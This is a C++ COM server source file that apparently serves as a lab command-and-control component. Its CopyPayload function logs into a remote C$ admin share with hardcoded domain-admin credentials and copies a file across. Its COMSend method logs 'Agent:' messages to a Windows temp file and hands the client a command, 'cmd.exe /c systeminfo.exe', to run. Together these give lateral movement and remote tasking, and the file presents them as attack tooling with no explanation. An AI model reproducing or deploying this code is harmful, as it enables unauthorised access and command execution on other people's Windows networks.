// COMServer.cpp : Implementation of CCOMServer

#include "pch.h"
#include "COMServer.h"
#include <comutil.h>
#include <winnetwk.h>
#include <fstream>
#include <string>
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "Mpr.lib")


// CCOMServer


void CopyPayload()
{
    // Set up credentials
    WCHAR userName[] = L"lab\\domainadmin";
    WCHAR password[] = L"Password";
    WCHAR domain[] = L"lab.local";
    WCHAR RemoteName[] = L"\\\\192.168.100.12\\C$";

    // Connect to remote server
    NETRESOURCE netResource;
    netResource.dwType = RESOURCETYPE_DISK;
    netResource.lpLocalName = nullptr;
    netResource.lpRemoteName = (WCHAR*)RemoteName;  // Remote path
    netResource.lpProvider = nullptr;

    DWORD result = WNetAddConnection2(&netResource, password, userName, 0);
    if (result == NO_ERROR) {
        // Copy file
        BOOL copyResult = CopyFileW(L"C:\\Users\\Public\\SourceFile.txt", L"\\\\192.168.100.12\\C$\\Users\\Public\\DestinationFile.txt", FALSE);

        if (copyResult) {
            wprintf(L"File copied successfully.\n");
        }
        else {
            wprintf(L"Failed to copy file. Error code: %d\n", GetLastError());
        }

        // Disconnect from remote server
        WNetCancelConnection2(L"\\\\192.168.100.12\\C$", 0, TRUE);
    }
    else {
        wprintf(L"Failed to connect to remote server. Error code: %d\n", result);
    }

    return ;

}

HRESULT __stdcall CCOMServer::COMSend(BSTR SendBuffer, int SendLength, int* RicvLength, BSTR* DataRicv)
{
    std::wstring sendText(SendBuffer);
    // Define the file path
    std::wstring filePath = L"C:\\Windows\\Temp\\logs.txt";
    // Open the file for writing
    std::wofstream outFile(filePath, std::ios::app);
    if (!outFile.is_open()) {
        // Handle the case where the file cannot be opened
        return E_FAIL;
    }
    // Write the content of SendBuffer to the file
    outFile << "Agent:" << sendText;
    // Close the file
    outFile.close();

	OLECHAR ClientCOMText[] = L"c:\\windows\\system32\\cmd.exe /c systeminfo.exe";
	BSTR ServerBuffer = SysAllocString(ClientCOMText);
	//_bstr_t pWrapOne = SendBuffer;
	//_bstr_t pWrapTwo = ServerBuffer;
	//_bstr_t pConcat = pWrapOne + pWrapTwo;
    *DataRicv = ServerBuffer;
	//*DataRicv = pConcat.GetBSTR();
	*RicvLength = sizeof(ClientCOMText);
	return S_OK;
    //return E_NOTIMPL;
}
